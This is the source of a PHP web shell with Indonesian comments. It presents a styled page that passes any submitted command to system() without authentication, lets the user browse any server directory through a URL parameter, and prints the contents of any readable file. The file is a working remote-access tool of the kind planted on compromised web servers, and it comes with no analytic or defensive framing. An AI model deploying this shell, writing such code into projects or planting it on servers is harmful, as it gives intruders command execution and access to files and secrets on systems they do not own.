<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Command Shell with File Preview</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 20px;
        }
        h2 {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
        }
        h3 {
            color: #333;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        table, th, td {
            border: 1px solid #ccc;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #4CAF50;
            color: white;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        a {
            color: #007bff;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        pre {
            background-color: #eee;
            padding: 10px;
            border: 1px solid #ccc;
            max-height: 300px;
            overflow: auto;
        }
        form {
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 300px;
            padding: 8px;
        }
        input[type="submit"] {
            padding: 8px 12px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

    <h2>PHP Command Execution with File Preview</h2>

    <?php
    // Dapatkan direktori dari parameter URL atau gunakan direktori saat ini
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    
    // Pastikan currentDir adalah direktori yang valid
    if (!is_dir($currentDir)) {
        echo "<p>Invalid directory: $currentDir</p>";
        exit;
    }

    // Pindah ke direktori yang dipilih
    chdir($currentDir);

    // Preview file jika ada file yang dipilih
    if (isset($_GET['file'])) {
        $filePath = $currentDir . DIRECTORY_SEPARATOR . $_GET['file'];

        if (is_file($filePath) && is_readable($filePath)) {
            echo "<h3>Preview of: " . htmlspecialchars($_GET['file']) . "</h3>";
            echo "<pre>";
            // Tampilkan isi file
            echo htmlspecialchars(file_get_contents($filePath));
            echo "</pre>";
        } else {
            echo "<p>File is not readable or does not exist.</p>";
        }
    }

    // Tampilkan form untuk menjalankan perintah
    ?>
    <form method="POST">
        <label for="command">Enter Command:</label><br>
        <input type="text" name="command" id="command" placeholder="Type your command here">
        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>">
        <input type="submit" value="Execute">
    </form>

    <?php
    // Eksekusi perintah jika ada input
    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['command'])) {
        $command = $_POST['command'];

        // Eksekusi perintah
        echo "<h3>Result:</h3>";
        echo "<pre>";
        system($command);
        echo "</pre>";
    }

    // Tampilkan current working directory
    echo "<h3>Current Directory:</h3>";
    echo "<p>$currentDir</p>";

    // Tampilkan navigasi untuk folder di level atas
    echo "<h3>Navigate:</h3>";
    $dirParts = explode(DIRECTORY_SEPARATOR, $currentDir);
    $path = '';
    foreach ($dirParts as $key => $part) {
        $path .= $part . DIRECTORY_SEPARATOR;
        echo "<a href=\"?dir=" . urlencode($path) . "\">$part</a>" . ($key < count($dirParts) - 1 ? ' / ' : '');
    }

    // Tampilkan isi direktori saat ini
    echo "<h3>Directory Contents:</h3>";

    // Tabel untuk menampilkan folder, tanggal, dan permission
    echo "<table>";
    echo "<tr><th>Name</th><th>Type</th><th>Last Modified</th><th>Permissions</th></tr>";
    
    $items = scandir($currentDir);
    
    foreach ($items as $item) {
        if ($item == '.') {
            continue;
        }

        $itemPath = $currentDir . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($itemPath);
        $type = $isDir ? 'Directory' : 'File';
        $modTime = date("F d Y H:i:s", filemtime($itemPath));
        $permissions = substr(sprintf('%o', fileperms($itemPath)), -4);

        echo "<tr>";
        if ($isDir) {
            // Direktori dapat diklik untuk navigasi
            $newDir = realpath($currentDir . DIRECTORY_SEPARATOR . $item);
            echo "<td><a href=\"?dir=" . urlencode($newDir) . "\">$item/</a></td>";
        } else {
            // File: buat link untuk preview isi file
            echo "<td><a href=\"?dir=" . urlencode($currentDir) . "&file=" . urlencode($item) . "\">$item</a></td>";
        }
        echo "<td>$type</td>";
        echo "<td>$modTime</td>";
        echo "<td>$permissions</td>";
        echo "</tr>";
    }

    echo "</table>";
    ?>

</body>
</html>
